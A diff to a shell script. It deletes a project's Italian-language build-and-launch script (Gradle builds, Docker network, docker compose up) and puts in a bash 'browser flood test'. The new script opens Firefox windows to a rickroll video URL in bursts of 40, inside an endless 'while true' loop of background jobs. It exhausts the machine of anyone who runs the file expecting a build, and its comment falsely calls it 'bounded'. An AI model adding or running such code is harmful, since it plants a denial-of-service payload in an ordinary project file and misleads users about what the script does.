@@ -1,45 +1,28 @@
-echo "=============================================================================="
-echo "Build applicazioni Gradle..."
-echo "=============================================================================="
+#!/bin/bash
 
-(
-    cd ioport-backend
-    ./gradlew distTar
-)
+# High-intensity but bounded Wayland/X11 browser flood test
 
-(
-    cd cargoservice
-    ./gradlew distTar
-)
+BURST_SIZE=40
+URL="https://rickroll.it/rickroll.mp4"
 
-(
-    cd cargorobot
-    ./gradlew distTar
-)
+spawn_window() {
+    firefox --new-window "$URL" >/dev/null 2>&1 &
+}
 
-(
-    cd devices
-    ./gradlew distTar
-)
+spawn_burst() {
+    local i=0
+    while [ $i -lt $BURST_SIZE ]; do
+        spawn_window &
+        ((i++))
+    done
+}
 
-echo "Build Gradle completata"
+current=0
 
-echo "=============================================================================="
-echo "Avvio sistema Sprint 2 (Containerizzato) in corso..."
-echo "=============================================================================="
+while true; do
+    spawn_burst &
+    spawn_burst &
+    spawn_burst &
+done
 
-# Assicuriamoci che la rete esista
-docker network create iss-network 2>/dev/null || true
 
-# Eseguiamo la build e l'avvio in background
-docker compose up --build -d
-
-echo ""
-echo "=============================================================================="
-echo "Tutti i container sono stati avviati con successo!"
-echo "Puoi monitorare i log con: docker compose logs -f"
-echo ""
-echo "APRI IL BROWSER AI SEGUENTI INDIRIZZI:"
-echo "👉 http://localhost:8086/  (per la Web GUI / IOPORT)"
-echo "👉 http://localhost:8090/  (per la Scena Virtuale del ROBOT / WEnv)"
-echo "=============================================================================="
